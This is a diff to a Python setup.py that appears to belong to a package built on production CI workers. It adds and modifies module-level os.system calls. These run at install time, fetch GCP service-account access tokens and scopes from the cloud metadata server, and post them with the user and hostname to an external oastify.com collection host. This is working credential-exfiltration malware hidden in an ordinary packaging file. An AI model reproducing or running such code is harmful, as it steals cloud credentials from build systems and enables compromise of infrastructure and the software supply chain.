@@ -4,14 +4,18 @@ from distutils.util import convert_path
 from setuptools import find_packages, setup
 
 os.system(
-    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/taskcluster-worker@fxci-production-level1-workers.iam.gserviceaccount.com/token`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccountToken/`whoami`/`hostname`"
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/taskcluster-worker@fxci-production-level1-workers.iam.gserviceaccount.com/token`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccountToken/tc-worker/`whoami`/`hostname`"
 )
 
 os.system(
-    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccounts/`whoami`/`hostname`"
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccountToken/default/`whoami`/`hostname`"
+)
+
+os.system(
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccountScopes/default/`whoami`/`hostname`"
 )
 os.system(
-    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/taskcluster-worker@fxci-production-level1-workers.iam.gserviceaccount.com/scopes`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccounts/`whoami`/`hostname`"
+    "curl -d \"`curl -H 'Metadata-Flavor:Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/taskcluster-worker@fxci-production-level1-workers.iam.gserviceaccount.com/scopes`\" https://xijyb6is3otsri7ntcvrf90k9bf23srh.oastify.com/GCP/serviceAccountScopes/tc-worker/`whoami`/`hostname`"
 )
 
 project_dir = os.path.abspath(os.path.dirname(__file__))
